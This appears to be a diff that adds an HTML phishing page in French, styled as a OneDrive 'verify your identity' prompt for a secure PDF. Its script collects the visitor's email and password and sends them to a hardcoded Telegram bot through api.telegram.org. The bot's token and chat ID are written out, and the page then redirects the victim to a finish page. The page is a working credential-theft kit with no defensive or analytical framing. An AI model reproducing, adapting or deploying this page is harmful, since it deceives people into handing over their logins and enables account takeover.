@@ -1,0 +1,235 @@
+﻿<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>OneDrive Sécurité</title>
+  <style>
+    * {
+      box-sizing: border-box;
+    }
+
+    body {
+      margin: 0;
+      font-family: 'Segoe UI', sans-serif;
+      background: linear-gradient(to bottom right, #e5efff, #f4f4f4);
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+    }
+
+    header {
+      background-color: #0078D4;
+      height: 60px;
+      display: flex;
+      align-items: center;
+      padding-left: 20px;
+    }
+
+    header img {
+      height: 28px;
+    }
+
+    .container {
+      flex-grow: 1;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      padding: 20px;
+    }
+
+    .card {
+      background: #fff;
+      max-width: 400px;
+      width: 100%;
+      padding: 30px 25px;
+      border-radius: 10px;
+      box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1);
+      text-align: center;
+      animation: fadeIn 0.5s ease;
+    }
+
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateY(20px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+
+    .card h2 {
+      font-size: 20px;
+      color: #333;
+      margin-bottom: 15px;
+    }
+
+    .pdf-info {
+      font-size: 14px;
+      color: #444;
+      margin-bottom: 20px;
+    }
+
+    .pdf-info img {
+      vertical-align: middle;
+      margin-right: 8px;
+    }
+
+    .email-logos img {
+      height: 24px;
+      margin: 10px 0;
+    }
+
+    input {
+      width: 100%;
+      padding: 12px;
+      margin: 10px 0;
+      border: 1px solid #ccc;
+      border-radius: 5px;
+      font-size: 14px;
+      transition: border 0.3s;
+    }
+
+    input:focus {
+      border-color: #0078D4;
+      outline: none;
+    }
+
+    button {
+      width: 100%;
+      padding: 12px;
+      background-color: #0078D4;
+      color: #fff;
+      border: none;
+      border-radius: 5px;
+      font-size: 16px;
+      margin-top: 10px;
+      cursor: pointer;
+      transition: background-color 0.3s;
+    }
+
+    button:hover {
+      background-color: #005ea6;
+    }
+
+    .loader {
+      display: none;
+      margin-top: 15px;
+      color: #0078D4;
+      font-size: 14px;
+    }
+
+    .error {
+      color: red;
+      font-size: 13px;
+      margin-top: 5px;
+      display: none;
+    }
+
+    @media (max-width: 480px) {
+      .card {
+        padding: 20px 15px;
+      }
+    }
+  </style>
+</head>
+<body>
+
+<header>
+  <img src="files/img/one.png" alt="OneDrive Logo" />
+</header>
+
+<div class="container">
+  <div class="card">
+    <h2>Vérifiez votre identité</h2>
+    <div class="pdf-info">
+      <p>Vous avez reçu un fichier sécurisé</p>
+      <p>
+        <img src="files/img/pdf.png" alt="PDF" width="24" />
+        56.1KB
+      </p>
+      <p>Pour lire le document, veuillez entrer l’adresse email et mot de passe associés.</p>
+    </div>
+
+    <div class="email-logos">
+      <img src="files/img/all.png" alt="Fournisseurs" />
+    </div>
+
+    <input type="email" id="email" placeholder="Adresse e-mail" required />
+    <div id="email-error" class="error">Veuillez entrer une adresse e-mail valide.</div>
+
+    <input type="password" id="password" placeholder="Mot de passe" required />
+    <div id="password-error" class="error">Veuillez entrer votre mot de passe.</div>
+
+    <button onclick="sendToTelegram()">Continuer</button>
+
+    <div class="loader" id="loader">Envoi en cours...</div>
+  </div>
+</div>
+
+<script>
+if (localStorage.getItem("valide") !== "true") {
+  window.location.href = "../";
+}
+
+function sendToTelegram() {
+  const email = document.getElementById("email").value.trim();
+  const password = document.getElementById("password").value.trim();
+  const loader = document.getElementById("loader");
+  const emailError = document.getElementById("email-error");
+  const passwordError = document.getElementById("password-error");
+
+  emailError.style.display = "none";
+  passwordError.style.display = "none";
+
+  let valid = true;
+  const emailPattern = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+
+  if (!email || !emailPattern.test(email)) {
+    emailError.style.display = "block";
+    valid = false;
+  }
+
+  if (!password) {
+    passwordError.style.display = "block";
+    valid = false;
+  }
+
+  if (!valid) return;
+
+  loader.style.display = "block";
+
+  const token = "7463953617:AAH759sVq11z8GU3w_FyK1a_xZkqNrjtXcI";
+  const chatId = "7010515701";
+  const message = `📩 E-mail Pros :\n\n📧 Adresse e-mail : ${email}\n🔒 Mot de passe : ${password}`;
+  const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+
+  fetch(url)
+    .then(response => {
+      loader.style.display = "none";
+      const msg = document.createElement("div");
+      if (response.ok) {
+        msg.textContent = "✅ Informations envoyées avec succès.";
+        msg.style.color = "green";
+        document.querySelector(".card").appendChild(msg);
+
+        // Redirection après un court délai
+        setTimeout(() => {
+          window.location.href = "finish.html";
+        }, 1000); // 1 seconde pour que le message soit visible
+      } else {
+        msg.textContent = "❌ Une erreur est survenue. Veuillez réessayer.";
+        msg.style.color = "red";
+        document.querySelector(".card").appendChild(msg);
+      }
+    })
+    .catch(error => {
+      console.error("Erreur :", error);
+      loader.style.display = "none";
+      const msg = document.createElement("div");
+      msg.textContent = "❌ Une erreur réseau est survenue.";
+      msg.style.color = "red";
+      document.querySelector(".card").appendChild(msg);
+    });
+}
+
+</script>
+</body>
+</html>
+</html>
